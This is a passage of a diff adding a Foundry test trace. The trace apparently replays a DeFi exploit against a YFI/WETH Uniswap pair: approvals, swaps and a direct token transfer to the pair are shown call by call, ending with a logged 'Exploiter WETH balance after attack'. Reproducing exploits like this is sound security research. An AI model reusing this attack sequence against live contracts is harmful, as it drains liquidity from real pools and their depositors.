+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 19: 5 → 0
+    │   │   │   │   │   @ 0x16102f891729262ce67210a124a159646f7714794acb4ed5a594ecb524124440: 5 → 0
+    │   │   │   │   └─ ← [Return] 19363816309062560436 [1.936e19]
+    │   │   │   └─ ← [Return] 19363816309062560436 [1.936e19]
+    │   │   ├─ [24420] WETH::approve(UniRouter: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: UniRouter: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x466c74776b1cb1a6f02cc765a14cd3bfd6607c3d7fcc2476c94e5bc071e25f00: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 42265380488549705698 [4.226e19]
+    │   │   ├─ [61706] UniRouter::swapTokensForExactTokens(58266247670198276 [5.826e16], 42265380488549705698 [4.226e19], [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1701484107 [1.701e9])
+    │   │   │   ├─ [2504] 0x2fDbAdf3C4D5A8666Bc06645B8358ab803996E28::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 24986106610326373189 [2.498e19], 101590573173886438616 [1.015e20], 1701482423 [1.701e9]
+    │   │   │   ├─ [8225] WETH::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fDbAdf3C4D5A8666Bc06645B8358ab803996E28, 238171969558556942 [2.381e17])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x2fDbAdf3C4D5A8666Bc06645B8358ab803996E28, value: 238171969558556942 [2.381e17])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000024a8ccb9f6cbb27e2 → 0x000000000000000000000000000000000000000000000002473ea37a73bcf6d4
+    │   │   │   │   │   @ 0x46f70a702121cc6383b14ae13b98d1d58c70a291d047b67750f3824cd24745ce: 0x00000000000000000000000000000000000000000000000581da380d3dd44cd8 → 0x0000000000000000000000000000000000000000000000058528603236d27de6
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [40650] 0x2fDbAdf3C4D5A8666Bc06645B8358ab803996E28::swap(58266247670198276 [5.826e16], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   ├─ [8252] YFI::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 58266247670198276 [5.826e16])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x2fDbAdf3C4D5A8666Bc06645B8358ab803996E28, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 58266247670198276 [5.826e16])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xcbd54bc1c0c3a89fc361baaef1c506990b33cadefb412365914f1ff2c2bf8e82: 0x0000000000000000000000000000000000000000000000015ac07b947c8b0345 → 0x00000000000000000000000000000000000000000000000159f17abc89c41341
+    │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000000010cba1856d596eab4 → 0x0000000000000000000000000000000000000000000000010d89192ec85ddab8
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [541] YFI::balanceOf(0x2fDbAdf3C4D5A8666Bc06645B8358ab803996E28) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 24927840362656174913 [2.492e19]
+    │   │   │   │   ├─ [534] WETH::balanceOf(0x2fDbAdf3C4D5A8666Bc06645B8358ab803996E28) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 101828745143444995558 [1.018e20]
+    │   │   │   │   ├─ emit Sync(reserve0: 24927840362656174913 [2.492e19], reserve1: 101828745143444995558 [1.018e20])
+    │   │   │   │   ├─ emit Swap(sender: UniRouter: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 0, amount1In: 238171969558556942 [2.381e17], amount0Out: 58266247670198276 [5.826e16], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 10: 0x000000000000000000000000000000f45bbcbea1c345b572b419199ea55e0738 → 0x000000000000000000000000000000f45d4253f6484361e283d72f6e8f0e51b8
+    │   │   │   │   │   @ 9: 0x000000000000000000000000000052bea260d1f43cc3c0890387e81412ac9537 → 0x000000000000000000000000000052bebb892d9072ea06cca6f608cc621a30d7
+    │   │   │   │   │   @ 8: 0x656a8fb700000000000581da380d3dd44cd80000000000015ac07b947c8b0345 → 0x656a95e70000000000058528603236d27de600000000000159f17abc89c41341
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Return] [238171969558556942 [2.381e17], 58266247670198276 [5.826e16]]
+    │   │   ├─ [541] YFI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 19422082556732758712 [1.942e19]
+    │   │   ├─ [3452] YFI::transfer(YFI_WETH: [0x088ee5007C98a9677165D78dD2109AE4a3D04d0C], 19422082556732758712 [1.942e19])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: YFI_WETH: [0x088ee5007C98a9677165D78dD2109AE4a3D04d0C], value: 19422082556732758712 [1.942e19])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000000010d89192ec85ddab8 → 0
+    │   │   │   │   @ 0xe472d763fa6e21c4bc485331b1fa769ff11eb41648bd707203be1d4bdf0eadd1: 0x000000000000000000000000000000000000000000000009728adb0d824e402b → 0x00000000000000000000000000000000000000000000000a8013f43c4aac1ae3
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xc37ae64cb820af7a868beca0686cbf1be04c1ed25ffbde37c9c9d44e3cc0d73d: 0 → 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03
+    │   │   │   @ 0xc37ae64cb820af7a868beca0686cbf1be04c1ed25ffbde37c9c9d44e3cc0d740: 0 → 1
+    │   │   └─ ← [Stop]
+    │   ├─ [541] YFI::balanceOf(YFI_WETH: [0x088ee5007C98a9677165D78dD2109AE4a3D04d0C]) [staticcall]
+    │   │   └─ ← [Return] 193696429338295802595 [1.936e20]
+    │   ├─ [2534] WETH::balanceOf(YFI_WETH: [0x088ee5007C98a9677165D78dD2109AE4a3D04d0C]) [staticcall]
+    │   │   └─ ← [Return] 784247844830628044735 [7.842e20]
+    │   ├─ emit Sync(reserve0: 193696429338295802595 [1.936e20], reserve1: 784247844830628044735 [7.842e20])
+    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 19422082556732758712 [1.942e19], amount1In: 0, amount0Out: 19363816309062560431 [1.936e19], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─  storage changes:
+    │   │   @ 10: 0x000000000000000000000000000000eece9b9074019e605153008210c4dc8954 → 0x000000000000000000000000000000eecf1214ae11446f5fbaa12abd05f1fc34
+    │   │   @ 9: 0x00000000000000000000000000004afd9e7fa6d4336e25c3aea03ccc3df99598 → 0x00000000000000000000000000004afda617af424a30f65696b55a3ea1712598
+    │   │   @ 8: 0x656a940700000000002a83a00bc013405fbf00000000000a7f44f36457e52ada → 0x656a95e700000000002a83a00bc013405fbf00000000000a8013f43c4aac1ae3
+    │   └─ ← [Stop]
+    ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 42027208518991148756 [4.202e19]
+    ├─ emit log_named_decimal_uint(key: "Exploiter WETH balance after attack", val: 42027208518991148756 [4.202e19], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 59.88s (58.52s CPU time)
+
+Ran 1 test suite in 71.87s (59.88s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
